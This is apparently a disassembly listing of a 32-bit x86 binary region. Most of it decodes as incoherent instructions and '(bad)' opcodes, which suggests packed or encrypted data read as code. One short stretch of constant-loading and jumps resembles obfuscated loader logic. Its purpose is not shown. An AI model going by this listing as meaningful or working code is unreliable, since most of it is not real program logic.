  40cd1f:	in     eax,0xad
  40cd21:	inc    esp
  40cd22:	jns    0x40cda0
  40cd24:	mov    dh,0xf
  40cd26:	sbb    DWORD PTR [ecx],0x4b
  40cd29:	inc    ebp
  40cd2a:	push   eax
  40cd2b:	jmp    0x62891c52
  40cd30:	daa    
  40cd31:	or     DWORD PTR [edx+0x31],edi
  40cd34:	test   al,0x82
  40cd36:	lds    ebp,FWORD PTR [esi+0x1dc6bc42]
  40cd3c:	or     eax,0x7982b406
  40cd41:	(bad)  
  40cd42:	test   al,0x8c
  40cd44:	and    al,0x4e
  40cd46:	adc    eax,0x7e00b0f0
  40cd4b:	(bad)  
  40cd4d:	mov    eax,0xad135fe4
  40cd52:	dec    eax
  40cd53:	ins    DWORD PTR es:[edi],dx
  40cd54:	jmp    0xc3a5d2f5
  40cd59:	pusha  
  40cd5a:	sub    eax,0x7ab1f4b8
  40cd5f:	xor    al,0x17
  40cd61:	add    dl,ah
  40cd63:	not    ah
  40cd65:	pop    ebx
  40cd66:	fisttp DWORD PTR [eax-0x78]
  40cd69:	add    esi,DWORD PTR ds:0x5c04d97b
  40cd6f:	push   ss
  40cd70:	mov    al,ds:0xcca42a7
  40cd75:	sub    bh,BYTE PTR [eax+0x10]
  40cd78:	movsx  edx,WORD PTR [ebp-0x17]
  40cd7c:	dec    eax
  40cd7d:	enter  0x8cde,0x9b
  40cd81:	and    BYTE PTR [ebx*4+0x1cd3120c],dh
  40cd88:	retf   0x868d
  40cd8b:	adc    al,0x4a
  40cd8d:	dec    esp
  40cd8e:	and    ebp,esp
  40cd90:	cdq    
  40cd91:	add    BYTE PTR [ecx],dh
  40cd93:	cmp    esp,ebx
  40cd95:	outs   dx,BYTE PTR ds:[esi]
  40cd96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd97:	sub    DWORD PTR [ebp-0x6e8782ff],ecx
  40cd9d:	jg     0x40cd6c
  40cd9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cda0:	jo     0x40cd91
  40cda2:	aas    
  40cda3:	pusha  
  40cda4:	jg     0x40cdad
  40cda6:	stc    
  40cda7:	inc    edx
  40cda8:	mov    al,bh
  40cdaa:	lods   eax,DWORD PTR ds:[esi]
  40cdab:	mov    eax,0x6dc465a6
  40cdb0:	pusha  
  40cdb1:	mov    cs,WORD PTR [edx+0x8]
  40cdb4:	lahf   
  40cdb5:	(bad)  
  40cdb6:	cwde   
  40cdb7:	dec    eax
  40cdb8:	punpcklbw mm5,DWORD PTR [edi+0x5]
  40cdbc:	mov    bl,0x90
  40cdbe:	xlat   BYTE PTR ds:[ebx]
  40cdbf:	push   ebx
  40cdc0:	sub    eax,0x660a4553
  40cdc5:	(bad)  
  40cdc6:	in     al,0xa1
  40cdc8:	mov    esp,0x16b5ef35
  40cdcd:	push   ebx
  40cdce:	jle    0x40cde6
  40cdd0:	push   0xc3f042e7
  40cdd5:	ja     0x40cd9f
  40cdd7:	in     eax,dx
  40cdd8:	addr16 into 
  40cdda:	mul    DWORD PTR [ecx-0x7f]
  40cddd:	ss push es
  40cddf:	mov    ecx,0xd4c3de2a
  40cde4:	mov    edx,DWORD PTR [esi+ebx*1]
  40cde7:	shl    BYTE PTR ds:0x270652be,cl
  40cded:	dec    edi
  40cdee:	div    BYTE PTR [ebp-0x20]
  40cdf1:	ret    0x8d6d
  40cdf4:	stc    
  40cdf5:	outs   dx,BYTE PTR ds:[esi]
  40cdf6:	xchg   ebx,eax
  40cdf7:	sti    
  40cdf8:	into   
  40cdf9:	mov    ?,WORD PTR [eax+ebp*1-0x426f08d6]
  40ce00:	pop    edx
  40ce01:	cmp    eax,DWORD PTR [ebx+0x17]
  40ce04:	sub    eax,0x69c47df7
  40ce09:	mov    dl,0x2f
  40ce0b:	je     0x40ce81
  40ce0d:	jb     0x40cdba
  40ce0f:	aaa    
  40ce10:	scas   al,BYTE PTR es:[edi]
  40ce11:	xor    BYTE PTR [edx+0x20fa3f8a],0xad
  40ce18:	adc    al,0x2b
  40ce1a:	lea    eax,fs:[edx]
  40ce1d:	das    
  40ce1e:	cli    
  40ce1f:	jmp    0xc0d64254
  40ce24:	or     edx,esi
  40ce26:	iret   
  40ce27:	data16 sub al,0x2e
  40ce2a:	xor    al,0x38
  40ce2c:	push   edi
  40ce2d:	fbld   TBYTE PTR [edx]
  40ce2f:	pop    ecx
  40ce30:	call   0x7b221a3e
  40ce35:	sbb    BYTE PTR [esi+ebx*1-0x21],dh
  40ce39:	rcl    bh,0xf6
  40ce3c:	leave  
  40ce3d:	jmp    0xb586:0xf7cb2b16
  40ce44:	out    0x8a,al
  40ce46:	and    al,0x6f
  40ce48:	(bad)  
  40ce49:	push   0x4e182a6c
  40ce4e:	jl     0x40cead
  40ce50:	mov    bh,0xea
  40ce52:	inc    edi
  40ce53:	fcomp  QWORD PTR [edx+0x4cb09771]
  40ce59:	pushf  
  40ce5a:	ficomp DWORD PTR [ebp-0x405d3232]
  40ce60:	mov    BYTE PTR [esi-0x701b2045],ah
  40ce66:	or     eax,0xed0160a0
  40ce6b:	sahf   
  40ce6c:	cdq    
  40ce6d:	add    eax,0x9d9d4894
  40ce72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce73:	pop    ebp
  40ce74:	and    DWORD PTR [edi],esi
  40ce76:	push   cs
  40ce77:	pop    ebx
  40ce78:	je     0x40ce1d
  40ce7a:	push   0xffffff82
  40ce7c:	jmp    0x40ce65
  40ce7e:	cdq    
  40ce7f:	mov    DWORD PTR [esi-0x4285bd83],esp
  40ce85:	jg     0x40ceb4
  40ce87:	sbb    DWORD PTR ds:0x76d3b644,edx
  40ce8d:	aam    0x36
  40ce8f:	int    0x91
  40ce91:	sbb    BYTE PTR [edi+edi*8],dl
  40ce94:	sbb    eax,0x72da521
  40ce99:	bound  ebx,QWORD PTR [ebp+0x38396fae]
  40ce9f:	pop    ds
  40cea0:	xor    DWORD PTR [edi+ebp*1+0x58be3501],ebp
  40cea7:	and    DWORD PTR [eax-0x4876d604],ebx
  40cead:	jo     0x40ce43
  40ceaf:	mov    ?,ecx
  40ceb1:	mov    ?,WORD PTR [edi+ebp*1]
  40ceb4:	test   eax,0xb5344507
  40ceb9:	outs   dx,BYTE PTR ds:[esi]
  40ceba:	xchg   ebp,eax
  40cebb:	push   ds
  40cebc:	push   esi
  40cebd:	pop    es
  40cebe:	jmp    0x317e:0x9d50df7f
  40cec5:	mov    WORD PTR [eax],fs
  40cec7:	ins    DWORD PTR es:[edi],dx
  40cec8:	xchg   esi,eax
  40cec9:	xchg   DWORD PTR [edi],esi
  40cecb:	adc    cl,dl
  40cecd:	aaa    
  40cece:	ret    
  40cecf:	or     cx,0xff80
  40ced3:	fist   DWORD PTR [esi-0x38]
  40ced6:	mov    eax,ds:0xd24ca1f9
  40cedb:	cwde   
  40cedc:	and    DWORD PTR [edi],ebx
  40cede:	or     esp,edi
  40cee0:	retf   
  40cee1:	clc    
  40cee2:	dec    esp
  40cee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cee4:	and    bh,BYTE PTR [ebp+0x35]
  40cee7:	mov    dh,0xe8
  40cee9:	dec    edi
  40ceea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceeb:	out    dx,eax
  40ceec:	sub    al,0x98
  40ceee:	mov    edx,DWORD PTR [edx+0x2dd56950]
  40cef4:	push   eax
  40cef5:	mov    eax,0x102c9a57
  40cefa:	cmp    eax,0x45c6f42d
  40ceff:	xor    al,BYTE PTR [ebx+eiz*4+0x1c95ab65]
  40cf06:	sbb    cl,BYTE PTR [ecx]
  40cf08:	in     eax,0x12
  40cf0a:	(bad)  [ebx]
  40cf0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf0d:	jae    0x40cee5
  40cf0f:	xchg   ebp,eax
  40cf10:	clc    
  40cf11:	pop    ss
  40cf12:	rcr    BYTE PTR [edi+0x5bcaa91],0x15
  40cf19:	mov    BYTE PTR [eax+ebx*1],dh
  40cf1c:	mov    esp,DWORD PTR [ecx+0x57]
  40cf1f:	ins    BYTE PTR es:[edi],dx
  40cf20:	fdivr  st,st(6)
  40cf22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf23:	repnz sub edx,esi
  40cf26:	or     eax,0x335ca6d8
  40cf2b:	mov    al,ds:0x8f642cb5
  40cf30:	mov    ds:0xc7f277db,eax
  40cf35:	adc    BYTE PTR [edx+edi*2-0x1f8f11a6],dl
  40cf3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf3d:	cmp    al,0x56
  40cf3f:	push   0xc79ebd9a
  40cf44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf45:	(bad)  
  40cf46:	mov    edi,0x504500c3
  40cf4b:	imul   ecx,ebx,0xb0ddde89
  40cf51:	jmp    0x57d8:0x258c18c
  40cf58:	ror    BYTE PTR ds:0xf54bf91b,cl
  40cf5e:	scas   eax,DWORD PTR es:[edi]
  40cf5f:	mov    dh,0x8e
  40cf61:	jb     0x40cf50
  40cf63:	ret    
  40cf64:	pusha  
  40cf65:	push   0xb7023469
  40cf6a:	jns    0x40cf86
  40cf6c:	inc    esp
  40cf6d:	nop
  40cf6e:	mov    edi,0x6eecbc3f
  40cf73:	(bad)  
  40cf74:	rcl    DWORD PTR [edx],1
  40cf76:	jmp    0x8e66:0xca75e6a7
  40cf7d:	cmp    eax,0xa09564a7
  40cf82:	cmp    DWORD PTR [ecx+0x44],ecx
  40cf85:	and    BYTE PTR [edi-0x68],dh
  40cf88:	addr16 pusha 
  40cf8a:	cs aas 
  40cf8c:	xor    esp,0xffffffff
  40cf8f:	scas   eax,DWORD PTR es:[edi]
  40cf90:	(bad)  
  40cf91:	aaa    
  40cf92:	push   ebx
  40cf93:	fs retf 
  40cf95:	(bad)  
  40cf96:	leave  
  40cf97:	rcl    DWORD PTR [ebp+0x4a5476d9],cl
  40cf9d:	cmp    DWORD PTR [ecx+edx*1+0x7beac512],eax
  40cfa4:	sbb    DWORD PTR [edx+0x70],eax
  40cfa7:	sub    eax,0x38b157d
  40cfac:	shl    BYTE PTR [ebx+0x39],0x3
  40cfb0:	mov    ch,0x5f
  40cfb2:	mov    WORD PTR [ebx],es
  40cfb4:	loop   0x40d019
  40cfb6:	xor    DWORD PTR [esi+0x3695533b],0x1fb7d9d3
  40cfc0:	push   0xbee3175e
  40cfc5:	sub    eax,0xcd30ed5b
  40cfca:	enter  0x66b5,0xf7
  40cfce:	pop    edx
  40cfcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfd0:	cmp    esp,DWORD PTR [edx-0x34]
  40cfd3:	and    edx,DWORD PTR [edx+0x64]
  40cfd6:	fdiv   QWORD PTR [ecx-0x4d]
  40cfd9:	aam    0x9b
  40cfdb:	cmp    DWORD PTR [edi+0x5f],ecx
  40cfde:	cmp    eax,0x8dd55f3d
  40cfe3:	mov    eax,0x3d99819f
  40cfe8:	xchg   BYTE PTR [ecx-0x7],dl
  40cfeb:	mov    edi,0x899c60b7
  40cff0:	jge    0x40d061
  40cff2:	jl     0x40d004
  40cff4:	pop    ds
  40cff5:	cmp    BYTE PTR [edi],cl
  40cff7:	jg     0x40d02b
  40cff9:	add    esp,DWORD PTR [eax+0x4174fa75]
  40cfff:	loop   0x40cfb2
  40d001:	leave  
  40d002:	pop    DWORD PTR [edx]
  40d004:	iret   
  40d005:	cli    
  40d006:	push   cs
  40d007:	add    BYTE PTR [ebx+eax*8],cl
  40d00a:	nop
  40d00b:	mov    al,ds:0xdc97528f
  40d010:	outs   dx,DWORD PTR ds:[esi]
  40d011:	sbb    ch,BYTE PTR [esi]
  40d013:	mov    es,WORD PTR [esi+edx*2]
  40d016:	ret    0x2ae6
  40d019:	mov    al,ds:0x70ccfb6c
  40d01e:	inc    ebx
  40d01f:	xchg   edi,eax
  40d020:	mov    BYTE PTR [esi],bl
  40d022:	(bad)  
  40d023:	gs jmp 0x5041:0xf0e671cb
  40d02b:	aaa    
  40d02c:	pop    ebp
  40d02d:	icebp  
  40d02e:	push   ds
  40d02f:	call   0xa1bf114b
  40d034:	mov    esi,0xb864148a
  40d039:	mov    ds:0x55bbd67d,eax
  40d03e:	popa   
  40d03f:	aas    
  40d040:	inc    ebx
  40d041:	clc    
  40d042:	sbb    DWORD PTR [eax],esi
  40d044:	fcmovb st,st(7)
  40d046:	fmul   DWORD PTR [ebp+0x5cf8199]
  40d04c:	mov    dl,0x7b
  40d04e:	or     DWORD PTR [edi],ebp
  40d050:	fmul   QWORD PTR [eax-0x3e7d39d1]
  40d056:	mov    dh,0x24
  40d058:	ret    
  40d059:	xor    BYTE PTR [ebx+0x19],bh
  40d05c:	ret    
  40d05d:	stos   DWORD PTR es:[edi],eax
  40d05e:	mov    edi,0xfe86466e
  40d063:	outs   dx,BYTE PTR ds:[esi]
  40d064:	pop    edi
  40d065:	jge    0x40d029
  40d067:	addr16 mov esp,cs
  40d06a:	jne    0x40d073
  40d06c:	nop
  40d06d:	test   BYTE PTR [edi-0x45],ch
  40d070:	sub    DWORD PTR [ebx],esp
  40d072:	xlat   BYTE PTR cs:[ebx]
  40d074:	fbld   TBYTE PTR [edx+ebx*8+0x7e]
  40d078:	out    dx,al
  40d079:	and    DWORD PTR [edx-0x80],0x8bd9f550
  40d080:	cmc    
  40d081:	call   0x8ffdaf36
  40d086:	aad    0x10
  40d088:	lds    bx,DWORD PTR [edx+esi*1]
  40d08c:	lock cmp al,0x3b
  40d08f:	or     DWORD PTR [eax-0x21ce06ac],ebx
  40d095:	xchg   ebx,eax
  40d096:	xchg   edi,eax
  40d097:	or     eax,DWORD PTR [edi-0x50]
  40d09a:	ret    0x64d3
  40d09d:	mov    bl,0x78
  40d09f:	sar    BYTE PTR [esp+eax*2+0x74dc61f6],cl
  40d0a6:	push   eax
  40d0a7:	mov    bl,0xf9
  40d0a9:	and    DWORD PTR [ebp+0x12],0xa5c5d0be
  40d0b0:	sub    DWORD PTR [ebx+0x2c],esi
  40d0b3:	mov    ah,ah
  40d0b5:	sub    ah,ch
  40d0b7:	hlt    
  40d0b8:	shr    BYTE PTR [eax+0x3e],1
  40d0bb:	ret    
  40d0bc:	in     al,dx
  40d0bd:	sahf   
  40d0be:	out    0x86,eax
  40d0c0:	pop    edx
  40d0c1:	jle    0x40d11a
  40d0c3:	jnp    0x40d087
  40d0c5:	mov    ss,WORD PTR [ecx]
  40d0c7:	inc    ecx
  40d0c8:	mov    ch,BYTE PTR [ecx-0x92c3c8a]
  40d0ce:	or     cl,BYTE PTR [ecx-0x2d7c1fbb]
  40d0d4:	pop    edx
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	cdq    
  40d1ab:	ret    0xa4b6
  40d1ae:	xchg   ecx,eax
  40d1af:	out    0xbe,eax
  40d1b1:	mov    esi,0xbebec492
  40d1b6:	call   0x2d27ca4
  40d1bb:	and    eax,0x2efe2ecb
  40d1c0:	mov    al,ds:0x6eb30418
  40d1c5:	mov    bl,0xaf
  40d1c7:	and    eax,0xab90ccff
  40d1cc:	sub    al,0xd9
  40d1ce:	call   0x2173:0x2e6404d4
  40d1d5:	inc    edx
  40d1d6:	xchg   BYTE PTR [ebp-0x3c],al
  40d1d9:	push   ebx
  40d1da:	sub    BYTE PTR [ebx+0x44096fea],bh
  40d1e0:	mov    esp,0x4ea9dde8
  40d1e5:	ins    BYTE PTR es:[edi],dx
  40d1e6:	inc    edx
  40d1e7:	xchg   DWORD PTR [edi],esp
  40d1e9:	pop    ebp
  40d1ea:	ins    BYTE PTR es:[edi],dx
  40d1eb:	cld    
  40d1ec:	xor    al,0x6b
  40d1ee:	inc    ebx
  40d1ef:	pop    ds
  40d1f0:	and    ch,BYTE PTR [ecx-0x7a6f6fa1]
  40d1f6:	and    ecx,DWORD PTR [eax]
  40d1f8:	pop    esi
  40d1f9:	inc    esp
  40d1fa:	cmp    eax,0xc54853d7
  40d1ff:	jo     0x40d226
  40d201:	(bad)  
  40d202:	into   
  40d203:	push   eax
  40d204:	fnstsw WORD PTR [ebx+0x2ca29f57]
  40d20a:	ret    
  40d20b:	int3   
  40d20c:	cmp    esp,DWORD PTR [ebx+eax*1-0x62]
  40d210:	and    eax,0x2fa9f78e
  40d215:	(bad)  
  40d216:	gs push esi
  40d218:	sub    bl,bl
  40d21a:	mov    cl,0xef
  40d21c:	fcomp  st(1)
  40d21e:	idiv   ebp
  40d220:	leave  
  40d221:	frstor [edi+0x72f9597a]
  40d227:	mov    al,ds:0x932c348a
  40d22c:	xor    eax,ebx
  40d22e:	aad    0xa2
  40d230:	imul   esp,DWORD PTR [eax-0x56],0x65c410c7
  40d237:	in     al,0x54
  40d239:	in     eax,0x1
  40d23b:	je     0x40d1e3
  40d23d:	dec    edi
  40d23e:	fsub   st(4),st
  40d240:	or     BYTE PTR ds:0xe19e875,dl
  40d246:	jle    0x40d2ba
  40d248:	pop    esi
  40d249:	cmp    ebx,edx
  40d24b:	add    ch,dh
  40d24d:	add    DWORD PTR [edx],edx
  40d24f:	dec    edi
  40d250:	iret   
  40d251:	pop    esp
  40d252:	xchg   ebx,eax
  40d253:	mov    esp,0xcf71ecf
  40d258:	jl     0x40d2b6
  40d25a:	repnz pop ss
  40d25c:	shr    DWORD PTR ds:0x412ee077,cl
  40d262:	lock jmp 0xbdb3:0xc6ba596d
  40d26a:	inc    esp
  40d26b:	xor    ah,al
  40d26d:	sbb    al,0xa1
  40d26f:	idiv   DWORD PTR [esi+0xba615af]
  40d275:	xchg   ebp,eax
  40d276:	mov    ds:0x2797694a,al
  40d27b:	call   DWORD PTR [edi-0x21e783ef]
  40d281:	add    esp,DWORD PTR [edx+0x7a79037]
  40d287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d288:	mov    ch,0x86
  40d28a:	xchg   DWORD PTR [ebp+0x14e5d81e],edx
  40d290:	or     eax,0xb0b5ef3e
  40d295:	push   es
  40d296:	js     0x40d26f
  40d298:	test   DWORD PTR ds:0xe77a1097,eax
  40d29e:	or     dh,BYTE PTR [ebp+0x7a]
  40d2a1:	(bad)  
  40d2a3:	call   0x56603aa0
  40d2a8:	(bad)  
  40d2a9:	popa   
  40d2aa:	jg     0x40d239
  40d2ac:	or     BYTE PTR [esi],ah
  40d2ae:	xchg   ecx,eax
  40d2af:	sti    
  40d2b0:	data16 clc 
  40d2b2:	add    al,0xed
  40d2b4:	cmp    ah,dl
  40d2b6:	or     ebp,DWORD PTR [ecx]
  40d2b8:	(bad)  
  40d2b9:	mov    al,0xb3
  40d2bb:	lock (bad) [ebp+edx*8-0x67488280]
  40d2c3:	mov    ecx,0x29e5b582
  40d2c8:	lea    esi,[ecx-0xe]
  40d2cb:	mov    al,ds:0xd4f60d9a
  40d2d0:	mov    ds:0xa4752093,al
  40d2d5:	rcr    DWORD PTR [esi+0x73],cl
  40d2d8:	pushf  
  40d2d9:	mov    al,ds:0x92b533fe
  40d2de:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d2e0:	outs   dx,BYTE PTR ds:[esi]
  40d2e1:	or     edx,DWORD PTR [ebp+ebp*8-0x33]
  40d2e5:	xlat   BYTE PTR ds:[ebx]
  40d2e6:	jns    0x40d313
  40d2e8:	cmc    
  40d2e9:	retfw  
  40d2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ec:	or     al,0x80
  40d2ee:	jbe    0x40d2f1
  40d2f0:	or     al,0x7b
  40d2f2:	sub    eax,0x680f90dc
  40d2f7:	cli    
  40d2f8:	push   esi
  40d2f9:	dec    ebx
  40d2fa:	mov    ebx,0xd7c134e7
  40d2ff:	call   0xdf36:0x65eab8b8
  40d306:	(bad)  
  40d307:	test   al,0x40
  40d309:	dec    esi
  40d30a:	jae    0x40d2ec
  40d30c:	(bad)  
  40d30d:	jp     0x40d382
  40d30f:	add    al,0xe7
  40d311:	lea    ecx,[edi-0x76]
  40d314:	jl     0x40d305
  40d316:	xor    eax,0xdeea273
  40d31b:	popf   
  40d31c:	loopne 0x40d2af
  40d31e:	mov    ebp,0xff1de224
  40d323:	push   cs
  40d324:	jo     0x40d379
  40d326:	(bad)  
  40d327:	popa   
  40d328:	add    eax,0x48851858
  40d32d:	sbb    al,0xa4
  40d32f:	bound  edi,QWORD PTR [esi+0x7ff50a29]
  40d335:	sbb    ecx,DWORD PTR [eax+0x59d86d2e]
  40d33b:	xchg   esi,eax
  40d33c:	jle    0x40d39c
  40d33e:	daa    
  40d33f:	jecxz  0x40d36d
  40d341:	imul   esp,DWORD PTR [ebp-0x6deef359],0xffffffaf
  40d348:	fimul  WORD PTR [ebx-0x448e6b1b]
  40d34e:	ficomp DWORD PTR [edi+0x6279aa2e]
  40d354:	dec    ebx
  40d355:	scas   al,BYTE PTR es:[edi]
  40d356:	sbb    esi,ecx
  40d358:	or     DWORD PTR [ecx+0x28ca7b98],ecx
  40d35e:	sbb    BYTE PTR [ebx+0x179d706b],0xef
  40d365:	mov    al,ds:0x5f322ff2
  40d36a:	imul   edi,esi,0xffffffb6
  40d36d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36e:	sbb    esp,ecx
  40d370:	mov    bl,0x5
  40d372:	jo     0x40d336
  40d374:	xchg   esp,eax
  40d375:	je     0x40d31f
  40d377:	rcr    bh,cl
  40d379:	gs loop 0x40d348
  40d37c:	adc    al,0x39
  40d37f:	mov    ebp,DWORD PTR [ebx-0xd3a7b69]
  40d385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d386:	inc    esi
  40d387:	or     DWORD PTR [esi-0x12],0x8
  40d38b:	sbb    ah,BYTE PTR [edi-0x3fc7163f]
  40d391:	mov    cl,0xf7
  40d393:	jne    0x40d3d0
  40d395:	mov    DWORD PTR [ebp-0x5531dc27],eax
  40d39b:	cmp    DWORD PTR [edi+0x3bf987df],eax
  40d3a1:	or     edx,edx
  40d3a3:	out    dx,eax
  40d3a4:	inc    ebx
  40d3a5:	push   ebp
  40d3a6:	fidivr WORD PTR [edx+ecx*8]
  40d3a9:	jb     0x40d379
  40d3ab:	lea    esp,[ebx-0x59]
  40d3ae:	and    DWORD PTR [esi+0x5e292441],esp
  40d3b4:	jecxz  0x40d3fb
  40d3b6:	call   0x493813cc
  40d3bb:	mov    ah,0xcb
  40d3bd:	ret    0x418a
  40d3c0:	repnz inc DWORD PTR [ecx+0x4deeb939]
  40d3c7:	fs das 
  40d3c9:	call   0x47a1:0x7aa18732
  40d3d0:	jge    0x40d3ec
  40d3d2:	dec    ebp
  40d3d3:	pop    esi
  40d3d4:	jne    0x40d445
  40d3d6:	jl     0x40d3d5
  40d3d8:	adc    DWORD PTR [eax],edi
  40d3da:	mov    WORD PTR [edx-0x5e],cs
  40d3dd:	je     0x40d39f
  40d3df:	adc    dl,0x69
  40d3e2:	ret    
  40d3e3:	stos   BYTE PTR es:[edi],al
  40d3e4:	cmp    DWORD PTR [edi+0x45],ebp
  40d3e7:	dec    ebx
  40d3e8:	mov    edi,0xf14b4167
  40d3ed:	(bad)  
  40d3ee:	adc    al,0xd4
  40d3f0:	lock push ss
  40d3f2:	dec    ecx
  40d3f3:	jb     0x40d3bc
  40d3f5:	ret    0xda0
  40d3f8:	inc    esi
  40d3f9:	and    bh,BYTE PTR [edx+0x60]
  40d3fc:	int    0x31
  40d3fe:	pop    edx
  40d3ff:	jmp    0x6c3c33a3
  40d404:	or     ch,dl
  40d406:	aas    
  40d407:	outs   dx,DWORD PTR ds:[esi]
  40d408:	mov    dh,0x64
  40d40a:	loopne 0x40d3db
  40d40c:	enter  0x42c0,0x93
  40d410:	sbb    bl,ah
  40d412:	pop    ebp
  40d413:	pushf  
  40d414:	xchg   ebx,eax
  40d415:	fist   DWORD PTR gs:[edx+eiz*1+0x5b]
  40d41a:	jecxz  0x40d438
  40d41c:	inc    eax
  40d41d:	inc    edi
  40d41e:	out    0x5d,eax
  40d420:	pop    eax
  40d421:	imul   eax,DWORD PTR [ebx+0x460ba75f],0x53c142cb
  40d42b:	loope  0x40d45a
  40d42d:	adc    BYTE PTR [eax-0x2d7682b6],0xbd
  40d434:	pop    ss
  40d435:	(bad)  
  40d437:	push   ebx
  40d438:	inc    ebp
  40d439:	sbb    eax,0xf80ad4a3
  40d43e:	and    al,0x50
  40d440:	cwde   
  40d441:	push   edi
  40d442:	dec    esp
  40d443:	pop    edi
  40d444:	aas    
  40d445:	retf   
  40d446:	mov    dl,bl
  40d448:	test   DWORD PTR [eax],0x283ad5a1
  40d44e:	clc    
  40d44f:	and    BYTE PTR [esi+0x679ca5b1],ch
  40d455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d456:	pop    ds
  40d457:	pushf  
  40d458:	adc    BYTE PTR [ebp-0x3400b044],0x4
  40d45f:	repnz push esi
  40d461:	ficomp WORD PTR [ecx]
  40d463:	(bad)  
  40d464:	(bad)  
  40d465:	jnp    0x40d429
  40d467:	mov    edi,0x98862731
  40d46c:	scas   al,BYTE PTR es:[edi]
  40d46d:	mov    dl,0xe5
  40d46f:	aas    
  40d470:	rol    DWORD PTR [ebx-0x77],cl
  40d473:	mov    al,0xaa
  40d475:	inc    edi
  40d476:	mov    ds:0x5ea817c1,al
  40d47b:	mov    ds:0xa34588b7,eax
  40d480:	out    0x34,al
  40d482:	xor    esp,ebp
  40d484:	and    eax,DWORD PTR [edi+0x62]
  40d487:	ret    0x2a34
  40d48a:	jne    0x40d434
  40d48c:	or     eax,0x3a7c6568
  40d491:	dec    ecx
  40d492:	dec    ebx
  40d493:	xor    edi,DWORD PTR [edi-0x70]
  40d496:	addr16 add al,0x34
  40d499:	aaa    
  40d49a:	aaa    
  40d49b:	xchg   edi,eax
  40d49c:	stos   BYTE PTR es:[edi],al
  40d49d:	mov    dh,0x53
  40d49f:	in     al,0xf7
  40d4a1:	and    eax,0xbdc7625e
  40d4a6:	lock xchg ecx,eax
  40d4a8:	(bad)  
  40d4a9:	inc    BYTE PTR [edx]
  40d4ab:	add    al,0xc
  40d4ad:	mov    bh,0xf9
  40d4af:	mov    ds:0x55698689,eax
  40d4b4:	rcr    eax,0x4b
  40d4b7:	xchg   edx,eax
  40d4b8:	sub    dh,ah
  40d4ba:	repz mov al,ds:0x99b73bc2
  40d4c0:	daa    
  40d4c1:	clc    
  40d4c2:	pop    edi
  40d4c3:	xchg   ecx,eax
  40d4c4:	inc    esp
  40d4c5:	(bad)  
  40d4c6:	call   0x2343e6e5
  40d4cb:	sbb    bl,bl
  40d4cd:	retf   0xb198
  40d4d0:	push   eax
  40d4d1:	pop    edx
  40d4d2:	mov    bh,0xa2
  40d4d4:	adc    BYTE PTR [esp+ebx*2+0x72b1604a],bh
  40d4db:	call   0xc8c1af2d
  40d4e0:	xor    eax,0xe2ce1afe
  40d4e5:	push   ecx
  40d4e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4e7:	cmp    edx,DWORD PTR [ebx]
  40d4e9:	mov    esi,ebp
  40d4eb:	jge    0x40d476
  40d4ed:	mov    eax,ds:0xd93456be
  40d4f2:	and    DWORD PTR [edi],edi
  40d4f4:	add    dh,cl
  40d4f6:	mov    ch,0x48
  40d4f8:	psraw  mm1,QWORD PTR [edx-0x13]
  40d4fc:	xchg   esi,eax
  40d4fd:	sahf   
  40d4fe:	fs dec esi
  40d500:	out    0x54,al
  40d502:	aas    
  40d503:	mov    bl,0x24
  40d505:	push   0x5c3ba6d
  40d50a:	cmp    DWORD PTR [edi-0x5],0x46
  40d50e:	cwde   
